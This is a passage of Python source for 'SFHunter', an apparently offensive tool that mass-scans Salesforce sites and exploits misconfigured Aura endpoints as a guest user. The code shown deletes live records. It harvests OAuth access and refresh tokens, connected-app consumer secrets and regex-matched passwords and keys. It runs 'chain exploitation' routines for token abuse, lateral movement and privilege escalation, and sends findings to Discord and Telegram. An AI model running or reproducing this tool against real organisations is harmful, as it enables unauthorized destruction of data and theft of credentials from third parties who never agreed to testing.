            poc_result["summary"] = "UPDATE PoC error: {}".format(str(e))
            logger.error("UPDATE PoC error for {}: {}".format(object_name, e))
        
        return poc_result

    def perform_delete_poc(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Perform Proof of Concept for DELETE permission testing"""
        logger.info("🔍 Performing DELETE PoC for: {}".format(object_name))
        
        poc_result = {
            "exploitable": False,
            "payload": "",
            "response": "",
            "evidence": {},
            "summary": "",
            "risk_level": "LOW"
        }
        
        try:
            # First, try to get an existing record to delete
            list_payload = self.create_payload_for_getItems(object_name, 1, 1)
            list_response = self.exploit_aura_endpoint(endpoint, list_payload, aura_context)
            
            if list_response and not list_response.get('exceptionEvent'):
                actions = list_response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    if records:
                        record_id = records[0].get('Id')
                        if record_id:
                            payload = self.create_payload_for_delete_record(object_name, record_id)
                            poc_result["payload"] = payload
                            
                            logger.info("📤 Sending DELETE PoC payload for: {} (ID: {})".format(object_name, record_id))
                            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
                            poc_result["response"] = str(response)
                            
                            if response and not response.get('exceptionEvent'):
                                actions = response.get('actions', [])
                                if actions and actions[0].get('state') == 'SUCCESS':
                                    poc_result["exploitable"] = True
                                    poc_result["risk_level"] = "CRITICAL"
                                    poc_result["summary"] = "Successfully deleted {} record as guest user".format(object_name)
                                    poc_result["evidence"] = {
                                        "deleted_record_id": record_id,
                                        "response_data": actions[0].get('returnValue', {}),
                                        "timestamp": datetime.now().isoformat()
                                    }
                                    logger.info("🚨 DELETE PoC SUCCESS: {} record deleted!".format(object_name))
                                else:
                                    error_msg = actions[0].get('error', 'Unknown error') if actions else 'No actions'
                                    poc_result["summary"] = "DELETE failed: {}".format(error_msg)
                                    logger.info("❌ DELETE PoC FAILED: {}".format(error_msg))
                            else:
                                poc_result["summary"] = "DELETE failed: {}".format(response.get('exceptionEvent', 'Unknown error'))
                                logger.info("❌ DELETE PoC FAILED: {}".format(poc_result["summary"]))
                        else:
                            poc_result["summary"] = "No record ID found for DELETE test"
                    else:
                        poc_result["summary"] = "No records found for DELETE test"
                else:
                    poc_result["summary"] = "Failed to list records for DELETE test"
            else:
                poc_result["summary"] = "Failed to list records for DELETE test"
                
        except Exception as e:
            poc_result["summary"] = "DELETE PoC error: {}".format(str(e))
            logger.error("DELETE PoC error for {}: {}".format(object_name, e))
        
        return poc_result

    def generate_test_record_data(self, object_name: str) -> Dict:
        """Generate test data for creating records"""
        test_data = {}
        
        # Object-specific test data
        if object_name == 'User':
            test_data = {
                'FirstName': 'TestUser',
                'LastName': 'PoC',
                'Email': 'testpoc@example.com',
                'Username': 'testpoc_' + str(int(time.time())),
                'Alias': 'testpoc'
            }
        elif object_name == 'Account':
            test_data = {
                'Name': 'Test Account PoC',
                'Type': 'Customer',
                'Industry': 'Technology'
            }
        elif object_name == 'Contact':
            test_data = {
                'FirstName': 'Test',
                'LastName': 'Contact PoC',
                'Email': 'testcontact@example.com'
            }
        elif object_name == 'Lead':
            test_data = {
                'FirstName': 'Test',
                'LastName': 'Lead PoC',
                'Email': 'testlead@example.com',
                'Company': 'Test Company PoC'
            }
        elif object_name == 'Case':
            test_data = {
                'Subject': 'Test Case PoC',
                'Description': 'This is a test case created by SFHunter PoC',
                'Status': 'New',
                'Priority': 'Medium'
            }
        elif object_name == 'Task':
            test_data = {
                'Subject': 'Test Task PoC',
                'Status': 'Not Started',
                'Priority': 'Normal'
            }
        elif object_name == 'Event':
            test_data = {
                'Subject': 'Test Event PoC',
                'StartDateTime': datetime.now().isoformat(),
                'EndDateTime': (datetime.now() + timedelta(hours=1)).isoformat()
            }
        elif object_name == 'Note':
            test_data = {
                'Title': 'Test Note PoC',
                'Body': 'This is a test note created by SFHunter PoC'
            }
        else:
            # Generic test data
            test_data = {
                'Name': 'Test {} PoC'.format(object_name),
                'Description': 'Test record created by SFHunter PoC'
            }
        
        return test_data

    def generate_test_update_data(self, object_name: str) -> Dict:
        """Generate test data for updating records"""
        test_data = {}
        
        if object_name == 'User':
            test_data = {
                'FirstName': 'UpdatedTestUser',
                'LastName': 'PoCUpdated'
            }
        elif object_name == 'Account':
            test_data = {
                'Name': 'Updated Test Account PoC',
                'Type': 'Prospect'
            }
        elif object_name == 'Contact':
            test_data = {
                'FirstName': 'Updated',
                'LastName': 'Contact PoC'
            }
        elif object_name == 'Lead':
            test_data = {
                'FirstName': 'Updated',
                'LastName': 'Lead PoC',
                'Company': 'Updated Test Company PoC'
            }
        elif object_name == 'Case':
            test_data = {
                'Subject': 'Updated Test Case PoC',
                'Status': 'In Progress'
            }
        elif object_name == 'Task':
            test_data = {
                'Subject': 'Updated Test Task PoC',
                'Status': 'In Progress'
            }
        else:
            test_data = {
                'Name': 'Updated Test {} PoC'.format(object_name),
                'Description': 'Updated test record by SFHunter PoC'
            }
        
        return test_data

    def extract_api_keys_and_secrets(self, endpoint: str, aura_context: str) -> Dict:
        """Extract API keys, secrets, and tokens from Salesforce objects"""
        logger.info("🔍 Extracting API keys, secrets, and tokens...")
        
        secrets_found = {
            "oauth_tokens": [],
            "connected_apps": [],
            "static_resources": [],
            "api_keys": [],
            "secrets": [],
            "credentials": [],
            "critical_findings": []
        }
        
        try:
            # Extract OAuth tokens
            oauth_tokens = self.extract_oauth_tokens(endpoint, aura_context)
            if oauth_tokens:
                secrets_found["oauth_tokens"] = oauth_tokens
                secrets_found["critical_findings"].append(f"CRITICAL: Found {len(oauth_tokens)} OAuth tokens")
            
            # Extract Connected Applications
            connected_apps = self.extract_connected_applications(endpoint, aura_context)
            if connected_apps:
                secrets_found["connected_apps"] = connected_apps
                secrets_found["critical_findings"].append(f"CRITICAL: Found {len(connected_apps)} connected applications")
            
            # Extract Static Resources (may contain embedded secrets)
            static_resources = self.extract_static_resources(endpoint, aura_context)
            if static_resources:
                secrets_found["static_resources"] = static_resources
                secrets_found["critical_findings"].append(f"CRITICAL: Found {len(static_resources)} static resources")
            
            # Extract API keys from various sources
            api_keys = self.extract_api_keys_from_objects(endpoint, aura_context)
            if api_keys:
                secrets_found["api_keys"] = api_keys
                secrets_found["critical_findings"].append(f"CRITICAL: Found {len(api_keys)} API keys")
            
            # Extract secrets from custom objects
            custom_secrets = self.extract_secrets_from_custom_objects(endpoint, aura_context)
            if custom_secrets:
                secrets_found["secrets"] = custom_secrets
                secrets_found["critical_findings"].append(f"CRITICAL: Found {len(custom_secrets)} secrets in custom objects")
            
        except Exception as e:
            logger.error("Error extracting secrets: {}".format(e))
        
        return secrets_found

    def extract_oauth_tokens(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Extract OAuth tokens from OauthToken object"""
        oauth_tokens = []
        
        try:
            logger.info("🔍 Extracting OAuth tokens...")
            payload = self.create_payload_for_getItems("OauthToken", 50, 1)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    
                    for record in records:
                        token_data = {
                            "id": record.get('Id'),
                            "name": record.get('Name'),
                            "access_token": record.get('AccessToken'),
                            "refresh_token": record.get('RefreshToken'),
                            "client_id": record.get('ClientId'),
                            "user_id": record.get('UserId'),
                            "scope": record.get('Scope'),
                            "issued_at": record.get('IssuedAt'),
                            "expires_at": record.get('ExpiresAt')
                        }
                        
                        # Filter out empty/null values
                        token_data = {k: v for k, v in token_data.items() if v is not None and v != ''}
                        
                        if token_data:
                            oauth_tokens.append(token_data)
                            logger.info("🚨 Found OAuth token: {}".format(token_data.get('name', 'Unknown')))
            
        except Exception as e:
            logger.error("Error extracting OAuth tokens: {}".format(e))
        
        return oauth_tokens

    def extract_connected_applications(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Extract Connected Applications with credentials"""
        connected_apps = []
        
        try:
            logger.info("🔍 Extracting Connected Applications...")
            payload = self.create_payload_for_getItems("ConnectedApplication", 50, 1)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    
                    for record in records:
                        app_data = {
                            "id": record.get('Id'),
                            "name": record.get('Name'),
                            "consumer_key": record.get('ConsumerKey'),
                            "consumer_secret": record.get('ConsumerSecret'),
                            "callback_url": record.get('CallbackUrl'),
                            "oauth_policy": record.get('OauthPolicy'),
                            "permission_set": record.get('PermissionSet'),
                            "profile": record.get('Profile')
                        }
                        
                        # Filter out empty/null values
                        app_data = {k: v for k, v in app_data.items() if v is not None and v != ''}
                        
                        if app_data:
                            connected_apps.append(app_data)
                            logger.info("🚨 Found Connected App: {}".format(app_data.get('name', 'Unknown')))
            
        except Exception as e:
            logger.error("Error extracting Connected Applications: {}".format(e))
        
        return connected_apps

    def extract_static_resources(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Extract Static Resources that may contain embedded secrets"""
        static_resources = []
        
        try:
            logger.info("🔍 Extracting Static Resources...")
            payload = self.create_payload_for_getItems("StaticResource", 50, 1)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    
                    for record in records:
                        resource_data = {
                            "id": record.get('Id'),
                            "name": record.get('Name'),
                            "namespace": record.get('NamespacePrefix'),
                            "content_type": record.get('ContentType'),
                            "body_length": record.get('BodyLength'),
                            "cache_control": record.get('CacheControl'),
                            "description": record.get('Description')
                        }
                        
                        # Filter out empty/null values
                        resource_data = {k: v for k, v in resource_data.items() if v is not None and v != ''}
                        
                        if resource_data:
                            static_resources.append(resource_data)
                            logger.info("🚨 Found Static Resource: {}".format(resource_data.get('name', 'Unknown')))
            
        except Exception as e:
            logger.error("Error extracting Static Resources: {}".format(e))
        
        return static_resources

    def extract_api_keys_from_objects(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Extract API keys from various objects"""
        api_keys = []
        
        # Objects that commonly contain API keys
        key_objects = ['User', 'Organization', 'CustomObject', 'CustomField']
        
        for obj_name in key_objects:
            try:
                logger.info("🔍 Searching for API keys in: {}".format(obj_name))
                payload = self.create_payload_for_getItems(obj_name, 20, 1)
                response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
                
                if response and not response.get('exceptionEvent'):
                    actions = response.get('actions', [])
                    if actions and actions[0].get('state') == 'SUCCESS':
                        records = actions[0].get('returnValue', {}).get('records', [])
                        
                        for record in records:
                            # Search for potential API keys in record data
                            record_str = str(record).lower()
                            
                            # Common API key patterns
                            patterns = [
                                r'api[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
                                r'secret[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
                                r'access[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
                                r'client[_-]?secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
                                r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})'
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, record_str)
                                for match in matches:
                                    if len(match) > 10:  # Filter out short matches
                                        api_keys.append({
                                            "object": obj_name,
                                            "record_id": record.get('Id'),
                                            "key_type": "API Key",
                                            "value": match,
                                            "context": str(record)[:200] + "..." if len(str(record)) > 200 else str(record)
                                        })
                                        logger.info("🚨 Found potential API key in {}: {}".format(obj_name, match[:20] + "..."))
            
            except Exception as e:
                logger.error("Error searching for API keys in {}: {}".format(obj_name, e))
        
        return api_keys

    def extract_secrets_from_custom_objects(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Extract secrets from custom objects"""
        secrets = []
        
        # Get custom objects from the object list
        custom_objects = ['Alerts_Announcements__c', 'Community_Interactions__c', 'Feed_Meta__c']
        
        for obj_name in custom_objects:
            try:
                logger.info("🔍 Searching for secrets in custom object: {}".format(obj_name))
                payload = self.create_payload_for_getItems(obj_name, 20, 1)
                response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
                
                if response and not response.get('exceptionEvent'):
                    actions = response.get('actions', [])
                    if actions and actions[0].get('state') == 'SUCCESS':
                        records = actions[0].get('returnValue', {}).get('records', [])
                        
                        for record in records:
                            # Search for potential secrets in custom object data
                            record_str = str(record).lower()
                            
                            # Secret patterns
                            secret_patterns = [
                                r'password["\']?\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+-=]{8,})',
                                r'secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+-=]{8,})',
                                r'key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+-=]{16,})',
                                r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+-=]{16,})',
                                r'credential["\']?\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+-=]{8,})'
                            ]
                            
                            for pattern in secret_patterns:
                                matches = re.findall(pattern, record_str)
                                for match in matches:
                                    if len(match) > 8:  # Filter out short matches
                                        secrets.append({
                                            "object": obj_name,
                                            "record_id": record.get('Id'),
                                            "secret_type": "Custom Object Secret",
                                            "value": match,
                                            "context": str(record)[:200] + "..." if len(str(record)) > 200 else str(record)
                                        })
                                        logger.info("🚨 Found potential secret in {}: {}".format(obj_name, match[:20] + "..."))
            
            except Exception as e:
                logger.error("Error searching for secrets in {}: {}".format(obj_name, e))
        
        return secrets

    def chain_exploitation_attacks(self, endpoint: str, aura_context: str, secrets_data: Dict) -> Dict:
        """Chain multiple exploitation attacks based on found data"""
        logger.info("🔗 Chaining exploitation attacks...")
        
        chain_results = {
            "escalation_attempts": [],
            "lateral_movement": [],
            "data_exfiltration": [],
            "privilege_escalation": [],
            "critical_chains": []
        }
        
        try:
            # 1. OAuth Token Abuse
            if secrets_data.get("oauth_tokens"):
                oauth_abuse = self.abuse_oauth_tokens(endpoint, aura_context, secrets_data["oauth_tokens"])
                chain_results["escalation_attempts"].extend(oauth_abuse)
            
            # 2. Connected App Abuse
            if secrets_data.get("connected_apps"):
                app_abuse = self.abuse_connected_apps(endpoint, aura_context, secrets_data["connected_apps"])
                chain_results["lateral_movement"].extend(app_abuse)
            
            # 3. API Key Abuse
            if secrets_data.get("api_keys"):
                api_abuse = self.abuse_api_keys(endpoint, aura_context, secrets_data["api_keys"])
                chain_results["data_exfiltration"].extend(api_abuse)
            
            # 4. Privilege Escalation via User objects
            privilege_escalation = self.attempt_privilege_escalation(endpoint, aura_context)
            chain_results["privilege_escalation"].extend(privilege_escalation)
            
            # 5. Identify critical attack chains
            critical_chains = self.identify_critical_chains(chain_results)
            chain_results["critical_chains"] = critical_chains
            
        except Exception as e:
            logger.error("Error in chain exploitation: {}".format(e))
        
        return chain_results

    def abuse_oauth_tokens(self, endpoint: str, aura_context: str, oauth_tokens: List[Dict]) -> List[Dict]:
        """Attempt to abuse OAuth tokens for escalation"""
        abuse_results = []
        
        for token in oauth_tokens:
            try:
                logger.info("🔗 Attempting OAuth token abuse for: {}".format(token.get('name', 'Unknown')))
                
                # Try to use the token to access admin functions
                abuse_result = {
                    "token_name": token.get('name'),
                    "token_id": token.get('id'),
                    "abuse_attempts": [],
                    "successful_abuses": []
                }
                
                # Test token against admin endpoints
                admin_endpoints = [
                    "/services/data/v58.0/sobjects/User/describe",
                    "/services/data/v58.0/sobjects/Organization/describe",
                    "/services/data/v58.0/query/?q=SELECT+Id+FROM+User+WHERE+Profile.Name+LIKE+'%Admin%'"
                ]
                
                for admin_endpoint in admin_endpoints:
                    try:
                        # This would require implementing actual OAuth token usage
                        # For now, we'll log the attempt
                        abuse_result["abuse_attempts"].append({
                            "endpoint": admin_endpoint,
                            "status": "attempted",
                            "note": "OAuth token abuse attempt logged"
                        })
                    except Exception as e:
                        abuse_result["abuse_attempts"].append({
                            "endpoint": admin_endpoint,
                            "status": "failed",
                            "error": str(e)
                        })
                
                abuse_results.append(abuse_result)
                
            except Exception as e:
                logger.error("Error abusing OAuth token: {}".format(e))
        
        return abuse_results

    def abuse_connected_apps(self, endpoint: str, aura_context: str, connected_apps: List[Dict]) -> List[Dict]:
        """Attempt to abuse Connected Applications"""
        abuse_results = []
        
        for app in connected_apps:
            try:
                logger.info("🔗 Attempting Connected App abuse for: {}".format(app.get('name', 'Unknown')))
                
                abuse_result = {
                    "app_name": app.get('name'),
                    "app_id": app.get('id'),
                    "consumer_key": app.get('consumer_key'),
                    "abuse_attempts": [],
                    "lateral_movement": []
                }
                
                # Test if we can use the consumer key for lateral movement
                if app.get('consumer_key'):
                    abuse_result["abuse_attempts"].append({
                        "type": "consumer_key_abuse",
                        "consumer_key": app['consumer_key'][:10] + "...",
                        "status": "potential_lateral_movement",
                        "note": "Consumer key could be used for OAuth flows"
                    })
                
                abuse_results.append(abuse_result)
                
            except Exception as e:
                logger.error("Error abusing Connected App: {}".format(e))
        
        return abuse_results

    def abuse_api_keys(self, endpoint: str, aura_context: str, api_keys: List[Dict]) -> List[Dict]:
        """Attempt to abuse found API keys"""
        abuse_results = []
        
        for api_key in api_keys:
            try:
                logger.info("🔗 Attempting API key abuse for: {}".format(api_key.get('object', 'Unknown')))
                
                abuse_result = {
                    "object": api_key.get('object'),
                    "key_value": api_key.get('value', '')[:10] + "...",
                    "abuse_attempts": [],
                    "data_exfiltration": []
                }
                
                # Test API key against various endpoints
                test_endpoints = [
                    "/services/data/v58.0/sobjects/",
                    "/services/data/v58.0/query/",
                    "/services/data/v58.0/describe/"
                ]
                
                for test_endpoint in test_endpoints:
                    abuse_result["abuse_attempts"].append({
                        "endpoint": test_endpoint,
                        "status": "potential_data_exfiltration",
                        "note": "API key could be used for data exfiltration"
                    })
                
                abuse_results.append(abuse_result)
                
            except Exception as e:
                logger.error("Error abusing API key: {}".format(e))
        
        return abuse_results

    def attempt_privilege_escalation(self, endpoint: str, aura_context: str) -> List[Dict]:
        """Attempt privilege escalation attacks"""
        escalation_results = []
        
        try:
            logger.info("🔗 Attempting privilege escalation...")
            
            # Try to access admin user data
            admin_payload = self.create_payload_for_getItems("User", 10, 1)
            admin_response = self.exploit_aura_endpoint(endpoint, admin_payload, aura_context)
            
            if admin_response and not admin_response.get('exceptionEvent'):
                actions = admin_response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    
                    for record in records:
                        if 'admin' in str(record).lower() or 'system' in str(record).lower():
                            escalation_results.append({
                                "type": "admin_user_access",
                                "user_id": record.get('Id'),
                                "username": record.get('Username'),
                                "profile": record.get('Profile'),
                                "status": "potential_privilege_escalation"
                            })
                            logger.info("🚨 Found potential admin user: {}".format(record.get('Username', 'Unknown')))
            
        except Exception as e:
            logger.error("Error in privilege escalation: {}".format(e))
        
        return escalation_results

    def identify_critical_chains(self, chain_results: Dict) -> List[Dict]:
        """Identify critical attack chains"""
        critical_chains = []
        
        # Chain 1: OAuth Token + Admin Access
        if chain_results.get("escalation_attempts") and chain_results.get("privilege_escalation"):
            critical_chains.append({
                "chain_name": "OAuth Token to Admin Access",
                "severity": "CRITICAL",
                "description": "OAuth tokens found with potential admin user access",
                "impact": "Full organization compromise possible"
            })
        
        # Chain 2: API Keys + Data Exfiltration
        if chain_results.get("api_keys") and chain_results.get("data_exfiltration"):
            critical_chains.append({
                "chain_name": "API Key Data Exfiltration",
                "severity": "HIGH",
                "description": "API keys found with data exfiltration capabilities",
                "impact": "Sensitive data exposure"
            })
        
        # Chain 3: Connected Apps + Lateral Movement
        if chain_results.get("connected_apps") and chain_results.get("lateral_movement"):
            critical_chains.append({
                "chain_name": "Connected App Lateral Movement",
                "severity": "HIGH",
                "description": "Connected applications with lateral movement potential",
                "impact": "Expanded attack surface"
            })
        
        return critical_chains

    def test_soql_query_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test SOQL query access"""
        try:
            # Test basic SOQL query
            query = "SELECT Id, Name FROM User LIMIT 10"
            payload = self.create_advanced_query_payload(query)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                return {
                    "success": True,
                    "message": "SOQL queries accessible",
                    "sample_query": query
                }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_describe_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test object describe access"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_sobject_describe', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                return {
                    "success": True,
                    "message": "Object describe accessible"
                }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_metadata_api_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test metadata API access"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_metadata', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                return {
                    "success": True,
                    "message": "Metadata API accessible"
                }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="High-performance Salesforce URL scanner with advanced detection capabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="Path to a file of URLs (one per line)")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("--ignore-ssl", action="store_true", help="Ignore SSL certificate errors")
    parser.add_argument("--discord-webhook", help="Discord webhook URL to send verified findings")
    parser.add_argument("--telegram-bot-token", help="Telegram bot token for notifications")
    parser.add_argument("--telegram-chat-id", help="Telegram chat ID for notifications")
    parser.add_argument("--high-performance", action="store_true", help="Enable high-performance parallel processing")
    parser.add_argument("--max-workers", type=int, default=50, help="Maximum number of worker threads (default: 50)")
    parser.add_argument("--concurrent-downloads", type=int, default=200, help="Maximum concurrent downloads (default: 200)")
    parser.add_argument("--batch-size", type=int, default=100, help="Batch size for processing (default: 100)")
    parser.add_argument("--connection-limit", type=int, default=100, help="HTTP connection limit (default: 100)")
    parser.add_argument("-v", "--version", action="version", version="SFHunter v1.0.0")
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        print("[!] Use -u <url> or -f <file>")
        parser.print_help()
        return
    
    # Initialize SFHunter
    detector = SFHunter(
        high_performance=args.high_performance,
        max_workers=args.max_workers,
        concurrent_downloads=args.concurrent_downloads,
        batch_size=args.batch_size,
        connection_limit=args.connection_limit
    )
    
    # Override Discord webhook if provided
    if args.discord_webhook:
        detector.config["discord_webhook_url"] = args.discord_webhook
    
    # Override Telegram settings if provided
    if args.telegram_bot_token:
        detector.config["telegram_bot_token"] = args.telegram_bot_token
    if args.telegram_chat_id:
        detector.config["telegram_chat_id"] = args.telegram_chat_id
    
    # Collect URLs
    urls = []
    if args.url:
        urls = [args.url]
    elif args.file:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}")
            return
        with open(args.file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    
    # Remove duplicates
    urls = list(set(urls))
    
    print(f"[+] Loaded {len(urls)} URL(s). Starting scan...")
    
    # Scan URLs
    results = detector.scan_urls(urls)
    
    # Print scan summary
    detector.print_scan_summary()
    
    # Always save results (even if empty)
    output_file = args.output or "salesforce_results.txt"
    filepath = detector.save_results(results, output_file)
    print(f"[+] Results saved → {filepath}")
    
    if results:
        # Send results summary to Discord and Telegram
        detector.send_discord_file(filepath, results)
        
        # Send summary to Telegram
        summary_message = f"""
🔍 <b>SFHunter Scan Complete</b>

📊 <b>Scan Summary:</b>
• Total URLs: {len(urls)}
• Successful scans: {len(results)}
• Salesforce instances found: {len(results)}

📁 <b>Results saved to:</b> <code>{filepath}</code>

<i>SFHunter Detection Complete</i>
"""
        detector.send_telegram_message(summary_message, filepath)
    else:
        print("[!] No Salesforce sites detected.")

if __name__ == "__main__":
    main()
